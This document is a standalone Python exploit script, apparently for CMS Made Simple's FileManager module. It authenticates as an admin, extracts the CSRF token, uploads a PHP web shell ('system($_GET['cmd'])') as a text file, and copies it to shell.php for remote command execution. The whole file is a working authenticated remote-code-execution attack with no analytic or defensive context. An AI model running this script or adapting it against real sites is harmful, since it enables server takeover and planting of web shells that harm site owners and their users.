import requests
import base64
import re

base_url = "https://target/admin"
upload_dir = "/uploads"
upload_url = base_url.split('/admin')[0] + upload_dir
username = "admin"
password = "password"
csrf_param = "_sk_"
txt_filename = 'cmsmsrce.txt'
php_filename = 'shell.php'
payload = "<?php system($_GET['cmd']);?>"

def authenticate():
    page = "/login.php"
    url = base_url + page
    data = {
        "username": username,
        "password": password,
        "loginsubmit": "Submit"
    }
    response = requests.post(url, data=data, allow_redirects=False, verify=False)
    
    print(f"[DEBUG] Status: {response.status_code}")
    print(f"[DEBUG] Location: {response.headers.get('Location', 'None')}")
    
    if response.status_code == 302:
        location = response.headers.get('Location', '')
        match = re.search(r'{}_?=([a-f0-9]+)'.format(csrf_param), location)
        csrf_token = match.group(1) if match else None
        print(f"[+] CSRF Token: '{csrf_token}' (len: {len(csrf_token) if csrf_token else 0})")
        return response.cookies, csrf_token
    return None, None

def upload_txt(cookies, csrf_token):
    mact = "FileManager,m1_,upload,0"
    page = "/moduleinterface.php"
    url = base_url + page
    data = {
        "mact": mact,
        csrf_param: csrf_token,
        "disable_buffer": 1
    }
    files = {'m1_files[]': (txt_filename, payload)}
    response = requests.post(url, data=data, files=files, cookies=cookies, verify=False)
    print(f"[*] Upload: {response.status_code}")
    return response.status_code == 200

def copy_to_php(cookies, csrf_token):
    mact = "FileManager,m1_,fileaction,0"
    page = "/moduleinterface.php"
    url = base_url + page
    b64 = base64.b64encode(txt_filename.encode()).decode()
    serialized = f'a:1:{{i:0;s:{len(b64)}:"{b64}";}}'
    
    data = {
        "mact": mact,
        csrf_param: csrf_token,
        "m1_fileactioncopy": "",
        "m1_path": upload_dir,
        "m1_selall": serialized,
        "m1_destdir": "/",
        "m1_destname": php_filename,
        "m1_submit": "Copy"
    }
    response = requests.post(url, data=data, cookies=cookies, allow_redirects=False, verify=False)
    print(f"[*] Copy: {response.status_code} -> {response.headers.get('Location', 'None')}")
    return response.status_code == 302

cookies, csrf_token = authenticate()
if cookies and csrf_token:
    print(f"[+] Starting exploit with CSRF: {csrf_token}")
    if upload_txt(cookies, csrf_token):
        if copy_to_php(cookies, csrf_token):
            print(f"[+] SUCCESS! Shell: {upload_url}/{php_filename}?cmd=id")
        else:
            print("[-] Copy failed")
    else:
        print("[-] Upload failed")
else:
    print("[-] Auth failed - check token extraction")
